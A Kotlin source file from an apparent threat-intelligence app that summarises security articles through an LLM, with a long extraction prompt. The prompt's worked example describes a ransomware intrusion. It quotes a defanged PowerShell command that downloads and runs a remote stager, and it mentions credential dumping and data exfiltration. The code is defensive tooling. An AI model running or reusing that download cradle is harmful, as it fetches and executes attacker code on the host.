package com.threatloom.app.domain.usecase

import com.squareup.moshi.Moshi
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import com.threatloom.app.data.remote.dto.*
import com.threatloom.app.data.repository.ArticleRepository
import com.threatloom.app.data.repository.QuizRepository
import com.threatloom.app.data.repository.SummaryRepository
import com.threatloom.app.domain.service.CostTracker
import com.threatloom.app.domain.service.LlmService
import com.threatloom.app.util.AppLogger
import com.threatloom.app.util.MarkdownComposer
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import retrofit2.HttpException
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject

class SummarizeArticlesUseCase @Inject constructor(
    private val articleRepository: ArticleRepository,
    private val summaryRepository: SummaryRepository,
    private val quizRepository: QuizRepository,
    private val llmService: LlmService,
    private val markdownComposer: MarkdownComposer,
    private val costTracker: CostTracker,
    private val appLogger: AppLogger
) {

    sealed class InvokeResult {
        data class Success(val cost: Double, val modelName: String) : InvokeResult()
        data class Error(val message: String) : InvokeResult()
    }
    companion object {
        private const val TAG = "SummarizeArticles"
        private const val MAX_CONTENT_CHARS = 20000

        private const val SUMMARY_PROMPT = """You are a senior cybersecurity threat intelligence analyst.
Given an article provided in the <article> element, produce a structured analysis as a JSON object
with these exact keys.

YOUR PRIMARY TASK IS EXTRACTION, NOT SUMMARIZATION. Do not condense the article into a brief
overview — capture every discrete technical fact. Treating a detail as "minor" and omitting
it is a failure mode. Be exhaustive. "Exhaustive" means no information is lost; it does NOT
mean repeating the same subject across many near-identical bullets — group such findings
(see CONSOLIDATION below).

CRITICAL: Preserve all technical specifics exactly as written in the article. None must be
omitted, generalized, or paraphrased.
If the article content appears sparse, fragmented, or contains unusual character sequences,
produce a best-effort analysis from whatever readable text is present — do not write
data-quality observations, encoding complaints, or placeholder text into any JSON field.

- "executive_summary": A concise paragraph (3-5 sentences) capturing the essence and
  significance of the threat, vulnerability, or finding. Be precise and informative.

- "details": A JSON array of strings. Each string is one technical finding from the
  article. Be EXHAUSTIVE but non-redundant — see CONSOLIDATION.

  For every article, actively scan for and extract each of the following when present:
  * Malware and tool family names, version strings, and build identifiers
  * CVE identifiers and CVSS scores
  * File names, full file paths, and file hashes (MD5 / SHA1 / SHA256)
  * Registry keys, mutex names, pipe names, and scheduled task names
  * Shell commands, PowerShell scripts, or code snippets — quote them exactly
  * Process names, service names, and DLL names involved in the attack
  * Network infrastructure: IP addresses, domains, URLs, ports, and protocols
  * C2 communication mechanisms: beacon interval, jitter, encryption, disguise profile
  * Encoding, obfuscation, packing, or anti-analysis techniques used by the malware
  * Persistence mechanisms: registry run keys, scheduled tasks, services, startup folders
  * Privilege escalation techniques and UAC bypass methods
  * Lateral movement tools and the methods used (pass-the-hash, Kerberoasting, etc.)
  * Credential access techniques and the specific credential stores targeted
  * Exfiltration tools, destination infrastructure, and data volume where stated
  * Ransom demand amounts, cryptocurrency, and negotiation portal details
  * Exact affected product names and their version strings
  * Targeted industries, geographies, and victim profiles
  * Timestamps, campaign dates, or observed activity timeframes
  * Attribution evidence: infrastructure overlap, code reuse, TTP fingerprints, cluster names
  * Quoted statistics, detection rates, infection counts, or impact metrics

  EXTRACTION RULES — follow these strictly:
  * Put genuinely distinct findings in separate bullets, but consolidate homogeneous
    findings into one bullet (see CONSOLIDATION below)
  * Never omit a finding because it seems minor; if the article states it, extract it
  * Preserve exact names, values, IDs, hashes, version strings, and commands verbatim
  * Coverage, not bullet count, is the goal: capture every specific from a detail-rich
    article, but do NOT split one relationship into many bullets to inflate the count, and
    do NOT merge unrelated facts to shrink it
  * The number of bullets must scale with what the article actually states; a short or thin
    article should yield only a few bullets. Do NOT fabricate, infer beyond the text, pad
    with generic background, or restate the executive summary as details to bulk up the list

  CONSOLIDATION — remove redundancy without losing any information:
  * When multiple findings share the same subject and action and differ only along one
    enumerable dimension (targets, sources, vectors, file types, etc.), express them as a
    SINGLE bullet that lists every value. Never drop any value.
  * Keep findings in separate bullets when they have different subjects or different
    actions, or when each value is an independent technical artifact carrying its own
    context (distinct hashes, CVEs, IPs, file paths, commands, version strings).
  * EXCEPTION to "different actions" above — same subject, multiple qualitative attributes:
    when several findings describe ONE shared subject and each merely states a static
    qualitative property of it (privileges required, attack complexity, exploitability /
    likelihood, severity, count of affected versions, etc.) rather than a distinct action it
    performs, join them into a SINGLE bullet with "and". Never apply this when a property is an
    independent technical artifact (hash, CVE, IP, file path, command, version string) — those
    stay in their own bullets.

    GOOD (consolidated, no information lost):
    - "Campaign targets developers through compromised npm publishing workflows and malicious package updates"
    - "Malware harvests API keys, cloud credentials, and SSH keys from developer systems"
    - "All three vulnerabilities require no user privileges and have low attack complexity"

    BAD (redundant — same subject/action repeated per item):
    - "Campaign targets developers through compromised npm publishing workflows"
    - "Campaign targets developers through malicious package updates"
    - "Malware harvests API keys from developer systems"
    - "Malware harvests cloud credentials from developer systems"
    - "Malware harvests SSH keys from developer systems"

    BAD (same subject split across separate attribute bullets — must be joined):
    - "All three vulnerabilities require no user privileges"
    - "All three vulnerabilities have low attack complexity"

    BAD (narrative / vendor-PR filler — carries no intelligence, must be dropped):
    - "By the following day after the vendor's claimed fix, new victims were still coming forward"
    - "The company reached out to affected users warning them of 'suspicious activity'"
    - "The company confirmed that steps have been taken to secure affected accounts"

  EXCLUDE — never place the following in "details" (they carry no threat-intelligence value,
  so dropping them is lossless):
  * Vendor or company PR or reassurance statements — e.g. "the company confirmed steps have been
    taken to secure accounts", "the vendor reached out to affected users", "the company takes
    security seriously". These describe communications, not threat artifacts.
  * Generic response or remediation announcements that name no specific technical action (no
    patch version, config change, detection rule, or concrete step). A genuine specific fix
    belongs in "mitigations" instead.
  * Narrative or chronological color that restates the situation without adding a new technical
    specific — e.g. "new victims were still coming forward the next day", "the issue remained
    unresolved for hours".
  * Journalistic framing, reactions, and opinion — these belong in "analyst_notes", not "details".

- "analyst_notes": A paragraph capturing the article author's expert opinions, analytical
  conclusions, and professional judgement — what they believe this means for the broader
  threat landscape, their assessment of severity or attribution, and any forward-looking
  observations. Focus on the analyst's voice and interpretation, not on facts already
  captured in "details". Leave empty string if no clear analyst opinion is expressed.

- "mitigations": A JSON array of strings. Each string is one actionable mitigation step or
  defensive recommendation; either as suggested by the article or based on your internal
  knowledge.

- "iocs": A JSON array of strings. Each string is one Indicator of Compromise explicitly
  mentioned in the article: IP addresses, domains, URLs, file hashes (MD5/SHA1/SHA256),
  file names, registry keys, mutexes, email addresses, or any other concrete artifact.
  Return an empty array [] if no IOCs are mentioned.

- "tags": A JSON array of 3-8 lowercase hyphenated tags. Always include at least one broad
  threat-category tag from this list: vulnerability, exploit, cve, malware, ransomware, trojan,
  infostealer, stealer, apt, threat-actor, phishing, credential-theft, data-breach, supply-chain,
  botnet, ddos, c2, iot, firmware. Then add specific tags such as malware family names, CVE IDs,
  targeted products, or affected vendors.

- "attack_flow": A JSON array representing the attack chain as ordered steps.
  Each step is an object with keys: "phase", "title", "description", "technique".
  - "phase" MUST be one of these official MITRE ATT&CK tactics (use exact spelling):
    "Reconnaissance", "Resource Development", "Initial Access", "Execution",
    "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
    "Discovery", "Lateral Movement", "Collection", "Command and Control",
    "Exfiltration", "Impact"
  - "title" should be the name of the specific MITRE ATT&CK technique used
    (e.g., "Spearphishing Attachment", "PowerShell", "OS Credential Dumping")
  - "technique" should be the MITRE ATT&CK technique ID if identifiable
    (e.g., "T1566.001", "T1059.001", "T1003"). Leave empty string if unknown.
  - "description" should explain how this step was used in the attack described
  If no attack sequence is described, return an empty array [].

Before generating your final answer, re-scan the article top to bottom and verify that every
technical detail has been captured in "details" or "iocs". Add any you missed.

--- EXAMPLE OF IDEAL EXTRACTION ---
The following shows the expected extraction quality for a detail-rich technical article.
Notice that every technical specific is captured and nothing is omitted, while homogeneous
findings are consolidated into single bullets. A shorter article would yield correspondingly
fewer bullets.

<article>
<title>BlackCat Ransomware Exploits CVE-2023-3519 in Citrix NetScaler to Breach Healthcare Network</title>
<content>
Researchers observed a BlackCat (ALPHV) ransomware campaign targeting US healthcare
organizations. The initial intrusion vector was CVE-2023-3519, a critical unauthenticated
remote code execution vulnerability (CVSS 9.8) in Citrix NetScaler ADC and Gateway, allowing
attackers to plant a webshell via a specially crafted HTTP request to unpatched appliances
running firmware versions prior to 13.1-49.13.

Within 30 minutes of initial access, the threat actor deployed a PHP webshell at
/var/netscaler/ns/var/vpn/bookmark/shell.php (MD5: a1b2c3d4e5f678900000000000000001). The
webshell was used to download a Cobalt Strike Beacon stager via PowerShell:
IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1').

The Beacon payload (SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a)
communicated with C2 at 185.220.101[.]47 over HTTPS port 443 using a 60-second beacon interval
with jitter. The malleable C2 profile masqueraded as Google Analytics traffic.

Lateral movement used PsExec renamed as svchost32.exe and WMI remote execution. Credentials were
harvested from LSASS memory using a modified Mimikatz variant
(SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b). BloodHound
(SharpHound) was deployed at C:\Windows\Temp\sharphound.exe for AD enumeration.

Prior to encryption, 2.3 TB of patient data was exfiltrated via Rclone v1.63.0, configured at
C:\ProgramData\rclone\rclone.conf targeting a Mega.nz endpoint. The BlackCat payload
(SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c) ran via a scheduled
task named 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and
appending the .alphv extension. The ransom note RECOVER-FILES.txt demanded $4.2M in Monero via
hxxp://alphvmmm27o3abo3r2m[.]onion.

The intrusion was attributed to affiliate cluster UNC4466 based on infrastructure overlap and
identical Cobalt Strike C2 profiles seen in three prior campaigns. Researchers note a shift from
financial services to healthcare targeting, driven by the sector's lower patch cadence.
</content>
</article>

IDEAL OUTPUT:
{
  "executive_summary": "A BlackCat (ALPHV) ransomware affiliate (UNC4466) compromised a US healthcare organization by exploiting CVE-2023-3519, a critical unauthenticated RCE in Citrix NetScaler ADC/Gateway (CVSS 9.8). The attacker deployed Cobalt Strike for C2, harvested domain credentials via modified Mimikatz, exfiltrated 2.3 TB of patient data via Rclone, then deployed BlackCat ransomware via scheduled task demanding $4.2M in Monero. Researchers attribute this to a deliberate sector pivot by UNC4466 exploiting healthcare's lower patch cadence.",
  "details": [
    "CVE-2023-3519 is an unauthenticated RCE in Citrix NetScaler ADC and Gateway with CVSS score 9.8",
    "Exploitation requires a specially crafted HTTP request; affects firmware versions prior to 13.1-49.13",
    "PHP webshell deployed at /var/netscaler/ns/var/vpn/bookmark/shell.php within 30 minutes of initial access",
    "Webshell MD5 hash: a1b2c3d4e5f678900000000000000001",
    "Cobalt Strike Beacon stager downloaded via PowerShell cradle: IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1')",
    "Cobalt Strike Beacon SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
    "C2 server: 185.220.101[.]47 over HTTPS port 443",
    "Beacon interval: 60 seconds with jitter",
    "Cobalt Strike malleable C2 profile masqueraded as Google Analytics traffic",
    "Lateral movement performed via PsExec (renamed as svchost32.exe) and WMI remote execution",
    "Modified Mimikatz variant used to harvest credentials from LSASS memory; SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
    "Credential harvest targeted domain administrator accounts",
    "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe for Active Directory enumeration",
    "2.3 TB of patient data exfiltrated prior to encryption",
    "Exfiltration tool: Rclone v1.63.0",
    "Rclone configured at C:\\ProgramData\\rclone\\rclone.conf targeting attacker-controlled Mega.nz storage",
    "BlackCat ransomware payload SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
    "Ransomware executed via scheduled task named 'MicrosoftEdgeUpdateTaskMachineCore2'",
    "BlackCat used ChaCha20-Poly1305 encryption with a per-file unique key",
    "Encrypted files received .alphv extension",
    "Ransom note filename: RECOVER-FILES.txt",
    "Ransom demand: $4.2M USD in Monero",
    "Negotiation portal: hxxp://alphvmmm27o3abo3r2m[.]onion",
    "Attribution to UNC4466 based on infrastructure overlap and identical Cobalt Strike C2 profiles across three prior campaigns",
    "Campaign represents a shift in targeting from financial services to healthcare"
  ],
  "analyst_notes": "Researchers assess UNC4466 deliberately pivoted to healthcare due to the sector's lower patch cadence and higher propensity to pay ransoms. The reuse of identical Cobalt Strike malleable C2 profiles across three campaigns suggests operational infrastructure reuse, creating a detection opportunity for defenders tracking this cluster.",
  "mitigations": [
    "Patch Citrix NetScaler ADC and Gateway to firmware 13.1-49.13 or later immediately to address CVE-2023-3519",
    "Audit Citrix appliances for webshells in /var/netscaler/ directories",
    "Block outbound connections to 185.220.101[.]47 and hunt for Cobalt Strike beacon patterns in network traffic",
    "Enable Credential Guard and restrict LSASS access to prevent Mimikatz-style credential dumping",
    "Block or alert on PsExec execution, especially with non-standard binary names",
    "Monitor for Rclone execution and large outbound transfers to cloud storage providers",
    "Audit scheduled tasks for entries masquerading as Microsoft update tasks",
    "Require MFA on domain administrator accounts to limit blast radius of credential theft"
  ],
  "iocs": [
    "185.220.101[.]47",
    "/var/netscaler/ns/var/vpn/bookmark/shell.php",
    "a1b2c3d4e5f678900000000000000001",
    "9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
    "f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
    "0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
    "C:\\Windows\\Temp\\sharphound.exe",
    "C:\\ProgramData\\rclone\\rclone.conf",
    "alphvmmm27o3abo3r2m[.]onion",
    "RECOVER-FILES.txt"
  ],
  "tags": ["ransomware", "blackcat", "alphv", "cve-2023-3519", "citrix-netscaler", "healthcare"],
  "attack_flow": [
    {
      "phase": "Initial Access",
      "title": "Exploit Public-Facing Application",
      "technique": "T1190",
      "description": "Exploited CVE-2023-3519 (CVSS 9.8) in unpatched Citrix NetScaler ADC/Gateway via unauthenticated RCE to deploy a PHP webshell at /var/netscaler/ns/var/vpn/bookmark/shell.php"
    },
    {
      "phase": "Execution",
      "title": "Command and Scripting Interpreter: PowerShell",
      "technique": "T1059.001",
      "description": "Used a PowerShell IEX download cradle via the webshell to fetch and execute a Cobalt Strike Beacon stager from 185.220.101[.]47"
    },
    {
      "phase": "Command and Control",
      "title": "Application Layer Protocol: Web Protocols",
      "technique": "T1071.001",
      "description": "Cobalt Strike Beacon beaconed over HTTPS to 185.220.101[.]47:443 every 60 seconds with jitter, using a malleable C2 profile impersonating Google Analytics"
    },
    {
      "phase": "Credential Access",
      "title": "OS Credential Dumping: LSASS Memory",
      "technique": "T1003.001",
      "description": "Modified Mimikatz variant dumped domain administrator credentials from LSASS memory"
    },
    {
      "phase": "Discovery",
      "title": "Domain Trust Discovery",
      "technique": "T1482",
      "description": "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe to enumerate Active Directory for privilege escalation and lateral movement paths"
    },
    {
      "phase": "Lateral Movement",
      "title": "Remote Services: SMB/Windows Admin Shares",
      "technique": "T1021.002",
      "description": "PsExec (renamed svchost32.exe) and WMI remote execution used with harvested domain admin credentials to move across domain-joined machines"
    },
    {
      "phase": "Exfiltration",
      "title": "Exfiltration to Cloud Storage",
      "technique": "T1567.002",
      "description": "Rclone v1.63.0, configured via C:\\ProgramData\\rclone\\rclone.conf, exfiltrated 2.3 TB of patient data to attacker-controlled Mega.nz storage"
    },
    {
      "phase": "Impact",
      "title": "Data Encrypted for Impact",
      "technique": "T1486",
      "description": "BlackCat ransomware executed via scheduled task 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and appending .alphv extension; RECOVER-FILES.txt demanded $4.2M in Monero"
    }
  ]
}
--- END EXAMPLE ---

The article to analyze is provided in the <article> element. Respond ONLY with valid JSON."""
    }

    private val moshi = Moshi.Builder().add(KotlinJsonAdapterFactory()).build()
    private val summaryAdapter = moshi.adapter(SummaryResult::class.java)

    /**
     * Summarizes all unsummarized articles in parallel with the given concurrency.
     * Returns total number of articles processed.
     */
    suspend operator fun invoke(
        concurrency: Int = 5,
        onRateLimited: (() -> Unit)? = null,
        onEach: (suspend () -> Unit)? = null
    ): Int {
        if (!llmService.hasApiKey()) return 0

        val articles = articleRepository.getUnsummarized(500)
        if (articles.isEmpty()) return 0

        val semaphore = Semaphore(concurrency)
        val summarized = AtomicInteger(0)
        val rateLimitNotified = AtomicBoolean(false)

        coroutineScope {
            for (article in articles) {
                launch {
                    semaphore.acquire()
                    try {
                        appLogger.i(TAG, "Summarizing article ${article.id}: ${article.title.take(60)}")
                        val ok = summarizeOne(
                            id = article.id,
                            title = article.title,
                            contentRaw = article.content_raw,
                            onRateLimited = {
                                if (rateLimitNotified.compareAndSet(false, true)) onRateLimited?.invoke()
                            }
                        )
                        if (ok) summarized.incrementAndGet() else markFailed(article.id)
                        onEach?.invoke()
                    } finally {
                        semaphore.release()
                    }
                }
            }
        }
        return summarized.get()
    }

    /** Pre-summarization cost estimate for a single article, or null when no API key is configured. */
    suspend fun estimateForArticle(): CostEstimate? {
        if (!llmService.hasApiKey()) return null
        val model = llmService.getModelName()
        return CostEstimate(articleCount = 1, estimatedCost = costTracker.estimateSummarizationCost(1, model), modelName = model)
    }

    /** Re-summarizes a single article by ID, overwriting any existing summary. */
    suspend fun invokeForArticle(articleId: Long): InvokeResult {
        if (!llmService.hasApiKey()) return InvokeResult.Error("No API key configured")
        val title = articleRepository.getTitle(articleId) ?: return InvokeResult.Error("Article not found")
        val contentRaw = articleRepository.getContentRaw(articleId) ?: return InvokeResult.Error("No content available")
        val model = llmService.getModelName()
        val before = costTracker.getSnapshot()
        val ok = summarizeOne(id = articleId, title = title, contentRaw = contentRaw)
        return if (ok) {
            quizRepository.deleteByArticleId(articleId)
            InvokeResult.Success(costTracker.deltaCost(before, costTracker.getSnapshot(), model), model)
        } else {
            InvokeResult.Error("Summarization failed")
        }
    }

    private suspend fun summarizeOne(
        id: Long,
        title: String,
        contentRaw: String,
        onRateLimited: (() -> Unit)? = null
    ): Boolean {
        val model = llmService.getModelName()
        var retryDelayMs = 10_000L
        for (attempt in 1..4) {
            try {
                var content = contentRaw
                if (content.length > MAX_CONTENT_CHARS) {
                    content = content.take(MAX_CONTENT_CHARS) + "\n\n[Content truncated...]"
                }
                // Strip control characters (null bytes, form feeds, etc.) that cause Claude
                // to treat the content as binary-corrupted. Preserves \t, \n, \r.
                content = content.filter { c ->
                    c.code !in 0..8 && c.code !in 11..12 && c.code !in 14..31 && c.code != 127
                }

                val resultJson = llmService.chatCompletion(
                    systemPrompt = SUMMARY_PROMPT,
                    messages = listOf(
                        ChatMessageDto("user", "<article>\n<title>$title</title>\n<content>\n$content\n</content>\n</article>")
                    ),
                    temperature = 0.3f,
                    maxTokens = 12000,
                    jsonMode = true,
                    cacheSystemPrompt = true
                ).content

                val result = summaryAdapter.fromJson(resultJson) ?: return false
                val summaryMd = markdownComposer.compose(result)
                val tagsJson = moshi.adapter<List<String>>(
                    com.squareup.moshi.Types.newParameterizedType(List::class.java, String::class.java)
                ).toJson(result.tags)
                val attackFlowJson = moshi.adapter<List<AttackFlowDto>>(
                    com.squareup.moshi.Types.newParameterizedType(List::class.java, AttackFlowDto::class.java)
                ).toJson(result.attackFlow)

                summaryRepository.upsert(
                    articleId = id,
                    summaryText = summaryMd,
                    keyPoints = if (result.attackFlow.isNotEmpty()) attackFlowJson else null,
                    tags = tagsJson,
                    modelUsed = model
                )
                return true
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                val httpEx = e as? HttpException
                val is429 = httpEx?.code() == 429 || e.message?.contains("429") == true
                if (is429 && attempt < 4) {
                    val retryAfterSec = httpEx?.response()?.headers()?.get("retry-after")?.toLongOrNull()
                    val waitMs = if (retryAfterSec != null) retryAfterSec * 1000L else retryDelayMs
                    appLogger.w(TAG, "Rate limited on article $id, waiting ${waitMs}ms (attempt $attempt)")
                    onRateLimited?.invoke()
                    delay(waitMs)
                    retryDelayMs = minOf(retryDelayMs * 2, 120_000L)
                } else {
                    appLogger.e(TAG, "Failed to summarize article $id: ${e.message}")
                    return false
                }
            }
        }
        return false
    }

    private suspend fun markFailed(articleId: Long) {
        summaryRepository.upsert(
            articleId = articleId, summaryText = "", keyPoints = null,
            tags = "[]", modelUsed = "failed"
        )
    }
}
